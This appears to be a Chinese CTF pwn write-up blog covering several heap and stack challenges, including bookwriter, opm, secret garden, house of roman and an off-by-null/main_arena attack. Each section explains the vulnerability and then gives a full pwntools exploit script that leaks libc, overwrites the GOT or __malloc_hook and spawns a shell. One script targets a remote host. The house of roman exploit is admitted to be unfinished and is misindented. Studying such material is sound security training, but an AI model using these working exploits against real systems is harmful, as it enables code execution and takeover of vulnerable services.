      char* _IO_read_ptr;   /* Current read pointer */
      char* _IO_read_end;   /* End of get area. */
      char* _IO_read_base;  /* Start of putback+get area. */
      char* _IO_write_base; /* Start of put area. */
      char* _IO_write_ptr;  /* Current put pointer. */
      char* _IO_write_end;  /* End of put area. */
      char* _IO_buf_base;   /* Start of reserve area. */
      char* _IO_buf_end;    /* End of reserve area. */
      /* The following fields are used to support backing up and undo. */
      char *_IO_save_base; /* Pointer to start of non-current get area. */
      char *_IO_backup_base;  /* Pointer to first valid character of backup area */
      char *_IO_save_end; /* Pointer to end of non-current get area. */
    
      struct _IO_marker *_markers;
    
      struct _IO_FILE *_chain;
    
      int _fileno;
    #if 0
      int _blksize;
    #else
      int _flags2;
    #endif
      _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */
    
    #define __HAVE_COLUMN /* temporary */
      /* 1+column number of pbase(); 0 is unknown. */
      unsigned short _cur_column;
      signed char _vtable_offset;
      char _shortbuf[1];
    
      /*  char* _save_gptr;  char* _save_egptr; */
    
      _IO_lock_t *_lock;
    #ifdef _IO_USE_OLD_IO_FILE
    };

我们关注的chain字段在偏移为14的地方，由于我们已经把io_list_all修改为unsortedbin地址，那么他所指向的下一个地址就存储在unsorted bin + 14的地方，这个地址位于main arena中，存储的是大小为0x60的smallbin（smallbin[4]），所以我们需要将原unsorted chunk的size改为0x60，之后再次执行malloc时，就会将其置入unsorted bin + 14的地方。
当程序分配内存错误时，会触发以下的函数：
malloc_printerr==>libc_message==>abort==>IO_flush_all_lockp
因为vtable中的函数调用时会把对应的_IO_FILE_plus指针作为第一个参数传递，因此这里我们把"/bin/sh"写入_IO_FILE_plus头部。
另外需要将

    1.fp->mode>0
    2._IO_vtable_offset (fp) ==0
    3.fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base

这样的条件来构造fake file
再次申请堆块触发报错，（因为原来的堆块已经被我们搞的面目全非了，肯定报错），进而触发malloc_printerr==>libc_message==>abort==>IO_flush_all_lockp
这里vtable的结构为：

    287 struct _IO_jump_t
    288 {
    289     JUMP_FIELD(size_t, __dummy);
    290     JUMP_FIELD(size_t, __dummy2);
    291     JUMP_FIELD(_IO_finish_t, __finish);
    292     JUMP_FIELD(_IO_overflow_t, __overflow);
    293     JUMP_FIELD(_IO_underflow_t, __underflow);
    294     JUMP_FIELD(_IO_underflow_t, __uflow);
    295     JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    296     /* showmany */
    297     JUMP_FIELD(_IO_xsputn_t, __xsputn);
    298     JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    299     JUMP_FIELD(_IO_seekoff_t, __seekoff);
    300     JUMP_FIELD(_IO_seekpos_t, __seekpos);
    301     JUMP_FIELD(_IO_setbuf_t, __setbuf);
    302     JUMP_FIELD(_IO_sync_t, __sync);
    303     JUMP_FIELD(_IO_doallocate_t, __doallocate);
    304     JUMP_FIELD(_IO_read_t, __read);
    305     JUMP_FIELD(_IO_write_t, __write);
    306     JUMP_FIELD(_IO_seek_t, __seek);
    307     JUMP_FIELD(_IO_close_t, __close);
    308     JUMP_FIELD(_IO_stat_t, __stat);
    309     JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    310     JUMP_FIELD(_IO_imbue_t, __imbue);
    311 #if 0
    312     get_column;
    313     set_column;
    314 #endif
    315 };
调用的是overflow那里，把它改成system就行了
exp：

    from pwn import *
    
    io = process('./bookwriter')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    elf = ELF('bookwriter')
    context.log_level = 'debug'
    def add(size,content):
    	io.recvuntil('choice :')
    	io.sendline('1')
    	io.recvuntil('page :')
    	io.sendline(str(size))
    	io.recvuntil('Content :')
    	io.sendline(content)
    def view(idx):
    	io.recvuntil('choice :')
    	io.sendline('2')
    	io.recvuntil('page :')
    	io.sendline(str(idx))
    def edit(idx,content):
    	io.recvuntil('choice :')
    	io.sendline('3')
    	io.recvuntil('page :')
    	io.sendline(str(idx))
    	io.recvuntil('Content:')
    	io.sendline(content)
    def info():
    	io.recvuntil('choice :')
    	io.sendline('4')
    
    name = 'secunda'
    io.recvuntil('Author :')
    Author = 'A'*0x40
    io.send(Author)
    # Heap Overflow to Modify TopChunk Size
    add(0x28,'0'*0x28)          #id=0
    edit(0,'1'*0x28)
    edit(0,'\x00'*0x28+p16(0xfd1)+"\x00")
     
    # Trigger sysmalloc ==> _int_free TopChunk
    add(0x1000,'1'+'\n')        #id=1
     
    # leak libc_base
    add(0x1,'x')                #id=2
    view(2)
    io.recvuntil('Content :\n')
    leak = u64(io.recvuntil('\n',drop=True).ljust(0x8,'\x00'))
    print hex(leak)
    libc_base = leak - libc.symbols['__malloc_hook'] - 1560 - 0x20
    log.info('libbase:'+hex(libc_base))
    system_addr = libc_base+libc.symbols['system']
    log.info('system_addr:'+hex(system_addr))
    IO_list_all = libc_base+libc.symbols['_IO_list_all']
    log.info('_IO_list_all:'+hex(IO_list_all))


    info()
    io.recvuntil('A'*0x40)
    heap = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x10
    print hex(leak)
    io.recvuntil(')')
    io.sendline('1')
    io.recvuntil(':')
    io.sendline('A'*0x40)
    
    for i in range(0x3,0x9):
        add(0x20,str(i)*0x20)
    vtable_addr = heap+0x248
    payload = 0x2c*p64(0)
        #Fake File_stream in smallbin[4]
    fake_stream = ""
    fake_stream = "/bin/sh\x00"+p64(0x61)
    fake_stream += p64(0)+p64(IO_list_all-0x10)
    fake_stream = fake_stream.ljust(0xa0,'\x00')
    fake_stream += p64(heap+0x240)
    fake_stream = fake_stream.ljust(0xc0,'\x00')
    fake_stream += p64(1)+2*p64(0)+p64(vtable_addr)
    payload += fake_stream
    payload += p64(2)
    payload += p64(3)
    payload += p64(system_addr)
    gdb.attach(io)
    edit(0,payload)
    gdb.attach(io)
        # Trigger UnsortedBin Attack
        # malloc_printerr==>libc_message==>abort==>IO_flush_all_lockp
    io.recvuntil('Your choice :')
    io.sendline(str(1))
    io.recvuntil('Size of page :')
    io.sendline(str(0x10))
    io.interactive()
***9.opm***
强网杯的一道题目当时没做出来。。。
看着像一个堆题目其实是道栈溢出题目，涉及到堆的知识比较少
唯一的技巧点在于巧妙地利用**局部写**

    int (__fastcall **add())(__int64 a1)
    {
      _QWORD *v0; // rbx
      __int64 v1; // rbx
      size_t v2; // rax
      __int64 v3; // rbx
      char s[128]; // [rsp+0h] [rbp-1A0h]
      __int64 addr_of_struct[16]; // [rsp+80h] [rbp-120h]
      __int64 addr_of_name[17]; // [rsp+100h] [rbp-A0h]
      unsigned __int64 canary; // [rsp+188h] [rbp-18h]
    
      canary = __readfsqword(0x28u);
      v0 = (_QWORD *)operator new(0x20uLL);
      init_struct((__int64)v0);
      addr_of_struct[0] = (__int64)v0;
      *v0 = say;
      puts("Your name:");                           // func say
                                                    // name_addr->name(heap)
                                                    // len(name)
                                                    // punch
      gets(s);
      v1 = addr_of_struct[0];
      *(_QWORD *)(v1 + 16) = strlen(s);
      v2 = strlen(s);
      addr_of_name[0] = (__int64)malloc(v2);
      strcpy((char *)addr_of_name[0], s);
      *(_QWORD *)(addr_of_struct[0] + 8) = addr_of_name[0];
      puts("N punch?");
      gets(s);
      v3 = addr_of_struct[0];
      *(_DWORD *)(v3 + 0x18) = atoi(s);
      say(addr_of_struct[0]);
      return (int (__fastcall **)(__int64))addr_of_struct[0];
    }
两次gets都有溢出

    -00000000000001A0 s               db 128 dup(?)
    -0000000000000120 addr_of_struct  dq 16 dup(?)
    -00000000000000A0 addr_of_name    dq 17 dup(?)
    -0000000000000018 canary          dq ?
大致栈结构就这样
由于没有free函数，所以对于堆的利用比较局限
思路就是首先将 role1的结构体写到一个地址，然后把role2的结构体写到role1的name字段（堆上），之后把role2的地址也指向role1地址，这样就把role1的name打印出来，于是就可以泄露堆地址了。
由于事先我们并不知道地址是什么样，所以只能通过局部写改写地址的低字节
将role1的低字节覆盖为0010，而后添加role2，先通过第一次溢出把他的结构体搞到role1的name字段，这里可以通过把低字节改写成00做到（需要实现布局好堆结构，具体可以gdbattach调一下），而后再把role2地址改到0010
泄露完之后我们就可以将role指针随意的构造为堆上的地址了，我们最终的目的是把got表修改掉，这样就需要知道got地址和libc地址
泄露got地址主要就是构造一个伪造堆块，使他的name字段指向say函数，这样泄露地址就可以算出程序加载基地址，从而泄露got
libc同样道理
这里需要注意strlen函数以0结尾，所以我们构造的伪造role长度只能为0x10，也就是说会改变下一个堆块的头部（topsize），需要维护好topchunk
改写的话就利用第二次溢出，把地址写到len字段，改写完成
这里可以选择atoi或者strlen
exp：

    from pwn import *
    context.log_level = 'debug'
    io = process('./opm')
    elf = ELF('opm')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    
    def add(name,punch):
    	io.recvuntil('xit')
    	io.sendline('A')
    	io.recvuntil('name:')
    	io.sendline(name)
    	io.recvuntil('?')
    	io.sendline(punch)
    def show():
    	io.recvuntil('xit')
    	io.sendline('S')
    
    add(0x70*'A','1')
    add(0x80*'B'+'\x10','1')
    add(0x80*'C','A'*0x80+'\x10')
    io.recvuntil('B'*0x8)
    leak = u64(io.recvline()[0:6].ljust(8,'\x00'))
    log.success(hex(leak))
    
    func_addr = leak - 0x30
    fake_chunk_addr = leak + 0xc0
    fake_chunk = 'A'*0x8+p64(func_addr)
    payload = str(0x20171).ljust(0x80,'A') + p64(fake_chunk_addr)
    add(fake_chunk,payload)
    io.recvuntil('<')
    func = u64(io.recvline()[0:6].ljust(8,'\x00'))
    log.success(hex(func))
    proc_addr = func - 0xb30
    atoi_got = proc_addr + elf.got['atoi']
    fake_chunk = 'a'*0x8 + p64(atoi_got)
    payload = str(0x20171 - 0x50).ljust(0x80,'A') + p64(leak + 0xc0 +0x50)
    add(fake_chunk,payload)
    io.recvuntil('<')
    libc_base = u64(io.recvline()[0:6].ljust(8,'\x00')) - libc.symbols['atoi']
    log.success(hex(libc_base))
    system = libc_base + libc.symbols['system']
    log.success(hex(system))
    add('s3cunDa',str(system).ljust(0x80,'A')+p64(atoi_got - 0x18))
    add('s3cunDa','/bin/sh')
    io.interactive()

这么简单题我为什么那时候没做出来。。。
***10.main***
保护除了nx都没有开
典型的栈溢出题目（我很讨厌栈溢出说实话，但是考虑到队伍里就我一个pwn选手还是要看）
溢出处主要是

    000000000000000A buf             db 10 dup(?)            ; base 10
    +0000000000000000  s              db 8 dup(?)
    +0000000000000008  r              db 8 dup(?)
还有这里

    puts("stack:");
      return read(0, &buf, 0x20uLL);
主要就是溢出的字节数太少了
可以选择栈转移pivot或者别的奇技淫巧
这里有一个很好的技巧
利用的数rbp字段每次都会保存
具体payload如下：

    from pwn import *
    context.log_level = "debug"
    #p = process("./task_main")
    
    p = remote("202.112.51.184", 30002)
    elf = ELF("./task_main")
    libc = ELF("/libc.so.6")
    
    pop_rdi_ret = 0x400693
    pop_bx_bp_12131415_ret = 0x40068A
    vuln_call = 0x400611
    bss = 0x601060
    libc_init = 0x400670
    ret = 0x4004ae
    payload = []
    payload += [pop_rdi_ret, elf.got["read"], elf.plt["puts"]] # leak
    payload += [pop_bx_bp_12131415_ret, 0, 1, elf.got["read"], 0, elf.got["puts"], 8, 0x400670, 0,0,0,0,0,0,0] # read(0, got[puts], 8)
    payload += [pop_rdi_ret, bss, elf.plt["puts"]] # system("/bin/sh")
    
    def push(data):
        pl = "B" * 10
        pl += p64(data)
        pl += p64(vuln_call)
        once("A" * 0x1, pl)
    
    def once(bss, stack):
        p.recvuntil("bss:\n")
        p.send(bss)
        p.recvuntil("stack:\n")
        p.send(stack)


​    
    push(payload[-1])
    for i in xrange(1, len(payload)):
        push(payload[-i-1])
    
    #gdb.attach(p, "b *0x40068A\nc")
    
    pl = "B" * 10
    pl += p64(0)
    pl += p64(ret)
    once("/bin/sh\x00".ljust(0x10, "C"), pl)
    
    t = p.readline()[:6]
    puts = u64(t + "\x00\x00")
    base = puts - libc.symbols["read"]
    log.info("base: %lx", base)
    system = base + libc.symbols["system"]
    
    p.send(p64(system))
    
    p.interactive()
    p.close()

思路就是利用通用rop，改写got表还有一些调用约定了，没啥好说的

***11.secret garden***
很水的一道堆题
没啥好说的，主要就是uaf

    int sub_DD0()
    {
      int result; // eax
      _DWORD *v1; // rax
      unsigned int v2; // [rsp+4h] [rbp-14h]
      unsigned __int64 v3; // [rsp+8h] [rbp-10h]
    
      v3 = __readfsqword(0x28u);
      if ( !flower_count )
        return puts("No flower in the garden");
      __printf_chk(1LL, "Which flower do you want to remove from the garden:");
      __isoc99_scanf("%d", &v2);
      if ( v2 <= 0x63 && (v1 = (_DWORD *)heaplst[v2]) != 0LL )
      {
        *v1 = 0;
        free(*(void **)(heaplst[v2] + 8LL));
        result = puts("Successful");
      }
      else
      {
        puts("Invalid choice");
        result = 0;
      }
      return result;
    }
可以看到指针没清零
注意的一点是他每次会申请两个堆块
所以要注意一下堆风水
剩下的就是很基本的fastbin attack了

    from pwn import *
    context.log_level = 'debug'
    elf = ELF('secretgarden')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    io = process('./secretgarden')
    
    def add(l,name,color):
    	io.recvuntil(':')
    	io.sendline('1')
    	io.recvuntil('name :')
    	io.sendline(str(l))
    	io.recvuntil('name of flower :')
    	io.sendline(name)
    	io.recvuntil('color of the flower :')
    	io.sendline(color)
    def visit():
    	io.recvuntil(':')
    	io.sendline('2')
    def delete_one(idx):
    	io.recvuntil(':')
    	io.sendline('3')
    	io.recvuntil('garden:')
    	io.sendline(str(idx))
    def delete_all():
    	io.recvuntil(':')
    	io.sendline('4')
    
    add(0xb0,'a'*0xb0,'green')#0
    add(0x80,'a'*0x80,'red')#1
    delete_one(0)
    add(0x80,'a'*7,'green')#2
    
    visit()
    
    io.recvuntil('Name of the flower[2] :aaaaaaa\n')
    leak = u64(io.recvline()[0:6].ljust(8,'\x00'))
    log.success(hex(leak))
    libc_base = leak - 88 -0x10 - libc.symbols['__malloc_hook']
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    one = 0xe9415 + libc_base
    add(0x60,'a'*0x40,'purple')#3
    add(0x60,'b'*0x40,'black')#4
    
    delete_one(3)
    delete_one(4)
    delete_one(3)
    add(0x60,p64(malloc_hook - 0x23),'white')
    add(0x60,'b'*0x40,'black')
    add(0x60,'b'*0x40,'black')
    add(0x60,'a'*0x3+p64(one),'a')
    log.success(hex(one))
    gdb.attach(io)
    delete_one(1)
    delete_one(1)
    io.interactive()

***12.secret of my heart***
本来以为能在这道题里面找到什么骚操作
想多了，也是一道水题
漏洞就是个offbynull

    _BYTE *__fastcall add_imfo(__int64 *ptr, __int64 len)
    {
      _BYTE *result; // rax
      size_t size; // [rsp+0h] [rbp-20h]
    
      *ptr = len;
      printf("Name of heart :", len);
      get_str(ptr + 1, 0x20u);
      ptr[5] = malloc(size);
      if ( !ptr[5] )
      {
        puts("Allocate Error !");
        exit(0);
      }
      printf("secret of my heart :", 32LL);
      result = (ptr[5] + get_str(ptr[5], size));
      *result = 0;                                  // offbynull
                                                    // 
      return result;
    }
这里就是一个offbynull的利用方式，也是个套路
主要思想就是通过溢出的0字节把size缩小，然后下一次free的时候就不会改变下一个堆块的use位
剩下的没啥好说的，构造uaf，fastbinattack

    from pwn import *
    context.log_level = 'debug'
    io = process('./secret_of_my_heart')
    elf = ELF('secret_of_my_heart')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    
    def add(size,name,content):
    	io.recvuntil(':')
    	io.sendline('1')
    	io.recvuntil('Size of heart :')
    	io.sendline(str(size))
    	io.recvuntil('Name of heart :')
    	io.sendline(name)
    	io.recvuntil('secret of my heart :')
    	io.sendline(content)
    def delete(idx):
    	io.recvuntil(':')
    	io.sendline('3')
    	io.recvuntil('Index :')
    	io.sendline(str(idx))
    def show(idx):
    	io.recvuntil(':')
    	io.sendline('2')
    	io.recvuntil('Index :')
    	io.sendline(str(idx))
    
    add(0x88,'a','A'*0x80)#0
    add(0x100,'b','B'*0x100)#1
    add(0x80,'c','C'*0x80)#2
    add(0x60,'d','D'*0x60)#3
    delete(1)
    delete(0)
    add(0x88,'a','A'*0x88)#0
    add(0x80,'e','E'*0x80)#1
    add(0x60,'f','F'*0x60)#4
    delete(1)
    delete(2)
    add(0x80,'b','B'*0x80)#1
    show(4)
    ''''''
    io.recvuntil('Secret : ')
    leak = u64(io.recvline()[:6].ljust(8,'\x00'))
    libc_base = leak - 88 - 0x10 - libc.symbols['__malloc_hook']
    
    log.success('libc_base :'+hex(libc_base))
    one = 0xe9415 + libc_base
    mlh = libc_base + libc.symbols['__malloc_hook']
    log.success('one :'+hex(one))
    log.success('mlh :'+hex(mlh))
    
    add(0x60,'h','H'*0x5f)#2 == 4
    add(0x60,'g','G'*0x5f)#5
    delete(4)
    delete(3)
    delete(2)
    add(0x60,'h',p64(mlh - 0x23) + 'AAAA')#2
    add(0x60,'z','z')#3
    add(0x60,'y','y')#4
    add(0x60,'x','x'*3 + p64(one))
    gdb.attach(io)
    raw_input()
    delete(4)
    delete(2)
    
    io.interactive()

***13.house of roman***
题目为xman选拔赛 Noleak
当时没做出来，今天有时间看了下wp
题目主要是利用了aslr的低地址随机化程度不高，利用局部写可以得到一些我们想要的值，
题目中的漏洞很明显，一个是delete函数没有对指针清零，另一个就是update函数可以越界写
主要的难点就是没有printf之类的函数，不能泄露地址

    void delete()
    {
      unsigned int v0; // [rsp+Ch] [rbp-4h]
    
      say("Index: ", 7u);
      v0 = getinput();
      if ( v0 <= 9 )
        free(heaplst[v0]);                          // didnt nullified
    }      
    
                                         // can uaf maybe
——————————————————————————————————————————————————————
                                         
    int edit()
        {
          void *v0; // rax
          unsigned int nbytes; // ST0C_4
          int idx; // [rsp+8h] [rbp-8h]
        
          say("Index: ", 7u);
      LODWORD(v0) = getinput();
      idx = v0;
      if ( v0 <= 9 )
      {
        v0 = heaplst[v0];
        if ( v0 )
        {
          say("Size: ", 6u);
          nbytes = getinput();                      // over flow
          say("Data: ", 6u);
          LODWORD(v0) = read(0, heaplst[idx], nbytes);
        }
      }
      return v0;
    }
首先构造五个堆块，零号堆块的作用主要是堆结构的对齐以及修改一号堆块大小，风水堆块
其后的四个堆块分别大小为 0xd0 0x70 0xd0 0x70
目的主要是要利用unsortedbinattack以及fastbinattck，并且要保证不合并以及不被topchunk吞掉
控制一号堆块中的内容，使其看起来像是两个堆块，并且前一个堆块的大小为0x70，为后续的fastbin attack做准备
delete掉一号堆块和三号堆块，这时一号堆块fd指向mainarena，bk指向3号堆块
再次分配1号堆块，使原有的指针信息得以保留
释放2号和四号堆块，使其进入fastbin
利用0号堆块修改1号堆块的size为0x71，并利用uaf修改4号堆块的指针低字节，由于堆上的偏移固定，则可以令其指向1号堆块
修改一号堆块的fd指针的低2字节令其指向malloc hook - 0x23处
分配三个0x70da'xi大小的堆块，这样第三个堆块就是在mallochook附近了
我们现在需要向malloc hook 写入onegadget的地址，但是现在我们并不具有具体地地址信息，我们知道通过unsortedbinattack可以向任意地址写入固定值，这个固定值通过修改低字节可以得到onegadget的地址
这样我们修改三号堆块的bk指针使其指向malloc hook - 0x10，向malloc hook 写入一个main_arena 地址，通过修改刚刚申请到的位于malloc hook附近的堆块，改写其低字节，我们就可以达到使malloc hook 指向onegadget的效果
double free即可getshell

exp:

    from pwn import *
    context.log_level = 'debug'
    context.arch = "amd64"
    io = process('./NoLeak')
    elf = ELF('NoLeak')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    
    one = 0xe9415
    def add(size,data):
    	io.recvuntil(':')
    	io.sendline('1')
    	io.recvuntil('Size:')
    	io.sendline(str(size))
    	io.recvuntil
    
    (':')
        	io.sendline(data)
        def delete(index):
        	io.recvuntil(':')
        	io.sendline('2')
        	io.recvuntil('Index:')
        	io.sendline(str(index))
        def update(index,size,data):
        	io.recvuntil(':')
        	io.sendline('3')
        	io.recvuntil('Index:')
        	io.sendline(str(index))
        	io.recvuntil('Size:')
        	io.sendline(str(size))
        	io.recvuntil('Data:')
        	io.sendline(data)
        add(0x10,'A'*0x10)#0
        add(0xc0,'B'*0xc0)#1
        add(0x60,'C'*0x60)#2
        add(0xc0,'D'*0xc0)#3
        add(0x60,'E'*0x60)#4
        
        update(1,0xc0,'B'*0x68 + p64(0x61)) #split 1 to 2 chunks
        delete(1)
        delete(3)
        add(0xc0,'')#5 == 2
        delete(2)
        delete(4)
        update(0,0x20,'A'*0x18 + p64(0x71))
        update(4,1,'\x20')
        update(2,1,'\x1d')
        add(0x60,'E'*0x60)#6
        add(0x60,'C'*0x60)#7
        add(0x60,'')#8 --- mlh
        delete(7)
        update(7,8,p64(0))
        update(3,0x10,p64(0)+'\x0d')
        add(0xc0,'D'*0xc0)
        #_______brute force_______#
        update(8,0x13,'A'*3 + '\x15\x94\x0e')
        delete(0)
        delete(0)
        io.interactive()
        gdb.attach(io)
        raw_input()
exp并没有写完，因为我的虚拟机有些问题。。而且还要写暴力破解，懒
总结一下：
house of roman 主要就是通过改写低字节来控制指针的指向，通过fastbin的fd以及unsortedbin的fd，bk指针的一些特性达到控制堆地址和libc地址的效果，本质上是unsorted bin attack 结合 fastbin attack
首先控制写malloc hook 的堆块，而后利用unsorted bin attack向mallochook写入固定值，改写低地址
***14offbynull + unsortedbinattack + fastbin attack + main_arena ataack***
这个题目就是我一星期没睡好觉的罪魁祸首
在七夕节这天我终于弄懂了！！！！！！！

    while ( 1 )
      {
        choices();
        __isoc99_scanf("%d", &v3);
        switch ( v3 )
        {
          case 2:
            delete();
            break;
          case 3:
            show();
            break;
          case 1:
            add();
            break;
          default:
            puts("invalid~");
            break;
        }
标准的选单题目，但是没有edit函数
做的很绝，delete的时候都清空了，add时先把内存区域清零，而且只能申请0x80以上大小的堆块

    unsigned __int64 add()
    {
      int v1; // [rsp+0h] [rbp-10h]
      int i; // [rsp+4h] [rbp-Ch]
      unsigned __int64 v3; // [rsp+8h] [rbp-8h]
    
      v3 = __readfsqword(0x28u);
      for ( i = 0; i <= 15 && heap_list[i]; ++i )
        ;
      if ( i <= 15 )
      {
        printf("length: ");
        __isoc99_scanf("%d", &v1);
        if ( v1 > 127 && v1 <= 0x10000 )
        {
          heap_list[i] = malloc(v1);
          if ( !heap_list[i] )
          {
            puts("malloc failed.");
            exit(-1);
          }
          memset(heap_list[i], 0, v1);
          puts("your note:");
          suspect((__int64)heap_list[i], v1);
          puts("done.");
        }
        else
        {
          puts("invalid size");
        }
      }
      else
      {
        puts("you can't add anymore.");
      }
      return __readfsqword(0x28u) ^ v3;
    }
——————————————————————————————————————————————————————

    unsigned __int64 sub_D73()
    {
      int v1; // [rsp+4h] [rbp-Ch]
      unsigned __int64 v2; // [rsp+8h] [rbp-8h]
    
      v2 = __readfsqword(0x28u);
      printf("index: ");
      __isoc99_scanf("%d", &v1);
      if ( v1 >= 0 && v1 <= 15 && heap_list[v1] )
      {
        free(heap_list[v1]);
        heap_list[v1] = 0LL;
        puts("done.");
      }
      else
      {
        puts("invalid index.");
      }
      return __readfsqword(0x28u) ^ v2;
    }

主要漏洞点就一个

    unsigned __int64 __fastcall suspect(__int64 a1, unsigned int a2)
    {
      char buf; // [rsp+13h] [rbp-Dh]
      unsigned int i; // [rsp+14h] [rbp-Ch]
      unsigned __int64 v5; // [rsp+18h] [rbp-8h]
    
      v5 = __readfsqword(0x28u);
      for ( i = 0; i < a2; ++i )
      {
        buf = 0;
        if ( read(0, &buf, 1uLL) < 0 )
        {
          puts("Read error.");
          exit(-2);
        }
        if ( buf == 10 )
        {
          *(_BYTE *)(i + a1) = 0;
          return __readfsqword(0x28u) ^ v5;
        }
        *(_BYTE *)(a1 + i) = buf;
      }
      *(_BYTE *)(i + a1) = 0;                       // off by null
      return __readfsqword(0x28u) ^ v5;
    }
这里有一个offbynull漏洞
常规的方法肯定是用不了了，主体的思路就是leak地址，改写maxfast值，而后劫持topchunk指针，改写mallochook，getshell
1.leak
主要的就是利用offbynull的chunkshrink，利用unsortedbin分割产生的fd，bk指针，使其落到其中一个我们可控的堆块内，打印即可
2.改写maxfast
unsorted binattack：把bk改成global_max_fast-0x10,然后重新申请，maxfast的值改成一个很大的数字，这样以后的堆块就全是fastbin范围内的了
以上都是常规操作
3.劫持topchunk
首先需要知道main_arena的结构
从main_arena起始地址开始，第一个地址内存的是flag标志位，而后的七个地址内存的是从0x20--0x80大小的fastbin指针，后面的几个地址不知道干嘛的，但是main+0x58这里存储的是topchunk指针，unsortedbin指向它是因为把它当作头部处理
当我们改写fastbin大小的时候，大于0x80的fastbin会顺序的存储在后面的地址内，这样，我们申请一个大小为c0的堆块（算上头部大小），正好就落在了topchunk的地址内，这样我们就劫持了topchunk
4.修改mallochook
常规的修改mallochook指针的方式是利用fastbinattack，这里由于我们只能申请大于0x80大小的堆块，所以这里采用将topchunk修改为mallochook-0x10，而后从topchunk里申请，值得注意的一点是，由于之前的操作原本的堆结构以及指针已经面目全非，而在我们申请一个堆块的时候检查顺序是遍历所有bin，而后才在topchunk里寻找，这里我们需要维护unsortedbin的两个指针，使其指向自己，原理与劫持topchunk类似，在此不再赘述
具体细节参考exp，注释写的还算详细
exp：

    from pwn import *
    context.log_level = 'debug'
    def add(size,note):
    	p.sendlineafter(">> ","1")
    	p.sendlineafter("length: ",str(size))
    	p.sendafter("note:",note)
    
    def delete(index):
    	p.sendlineafter(">> ","2")
    	p.sendlineafter("index: ",str(index))
    
    def show(index):
    	p.sendlineafter(">> ","3")
    	p.sendlineafter("index: ",str(index))
    
    local=1
    libc=ELF('./libc.so.6')
    if local:
    	p=process('./offbyone2')#,env={'LD_PRELOAD':libc.path})
    else:
    	p=remote('127.0.0.1',10006)
    
    add(0x88,'A'*0x88)#0
    add(0x210,'B'*0x1f0+p64(0x200)+p64(0x21)+'\n')#1
    add(0x80,'C'*0x80)#2
    add(0x80,'D'*0x80)#3
    #gdb.attach(p)
    delete(1)
    #gdb.attach(p)
    delete(0)
    #gdb.attach(p)
    add(0x88,'A'*0x88)


    add(0x100,'B'*0x100)#1
    #gdb.attach(p)
    add(0x80,'D'*0x80)#4
    #gdb.attach(p)
    
    delete(1)
    #gdb.attach(p)
    delete(2)
    #gdb.attach(p)
    add(0x100,'B'*0x100)#1
    #gdb.attach(p)


    show(4)
    main_arena=u64(p.recvline(keepends=False).ljust(8,'\0'))-0x58
    print hex(main_arena)
    
    libc_base=main_arena-libc.symbols['__malloc_hook']-0x10
    print hex(libc_base)
    
    system=libc_base+libc.symbols['system']
    print "system",hex(system)


    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    one_gadget = libc_base + 0xe9415
    #one_gadget=libc_base+0xf02a4
    #global_max_fast=libc_base+0x3c67f8
    global_max_fast = main_arena +0x23e0
    delete(1)
    
    #gdb.attach(p)
    #re arrange the heap structure
    add(0x2a0,'a'*0x108+p64(0xc1)+'a'*0xb8+p64(0x91)+'a'*0x88+p64(0x51)+'\n')#1
    #split into 3 chunks
    
    delete(1)
    #gdb.attach(p)
    #add 1 to the unsortedbin
    add(0x300,'a\n')#1
    #gdb.attach(p)
    #now 1 in smallbins
    #new chunk from top chunk
    #main purpose is to add 1 to smallbin
    #because modify maxfast via unsortedbin attack will make
    #unsorted bin cant be used any more
    delete(4)
    #gdb.attach(p)
    #add 4 to th unsortedbin
    
    #unsortedbin attack, make fast max = unsorted bin's addr 
    add(0x2a0,'a'*0x108+p64(0xc0)+p64(global_max_fast-0x10)+p64(global_max_fast-0x10)+'a'*0xa0+p64(0xc0)+p64(0x91)+'\n')#2
    #gdb.attach(p)
    add(0xb0,'a\n')#4
    #gdb.attach(p)
    #raw_input()
    #now that since 4 is realloced,
    #so that the fake fd,bk now inseted into unsortedbin
    #their fd,bk now is unsortedbin's addr
    #it is excatly where global_max_fast lies in
    #p &global_max_fast
    #its a very large number
    delete(4)
    #hijack topchunk
    #insert into fastbin
    delete(2)
    
    #insert  the second large chunk,
    #which contains our fake chunk structure
    #main purpose is to re edit its content
    add(0x2a0,'a'*0x108+p64(0xc1)+p64(malloc_hook-0x10)+'\n')#2
    #make the fake fd ptr point to malloc_hook-0x10
    #global_max insert into smallbin
    
    add(0xb0,'a\n')#4
    #now top chunk is mlh4
    
    #now malloc_hook-0x10 inserted into fastbin
    delete(2)
    #re edit
    add(0x2a0,'a'*0x108+p64(0xf1)+'a'*0xe8+p64(0x61)+'\n')#2
    # enlarge the fake chunk
    delete(4)
    #change 4 size to f0
    #f->4->mlh-0x10
    delete(2)
    #reedit
    add(0x2a0,'a'*0x108+p64(0xf1)+p64(main_arena+0x58)+'a'*0xe0+p64(0x61)+'\n')#2
    #fake fd point to unsorted bin
    add(0xe0,'a\n')#4
    #f->mlh-10
    delete(2)
    #reedit
    add(0x2a0,'a'*0x108+p64(0xe1)+p64(main_arena+0x58)+'a'*0xd0+p64(0x71)+'\n')#2
    #shrink 4's size, 
    add(0xd0,'ZZZZZZZZ\n')#5
    #4 is used
    
    add(0x80,p64(one_gadget)+'\n')
    
    gdb.attach(p)
    delete(4)
    #gdb.attach(p)
    delete(5)
    #gdb.attach(p)
    raw_input()
    p.interactive()
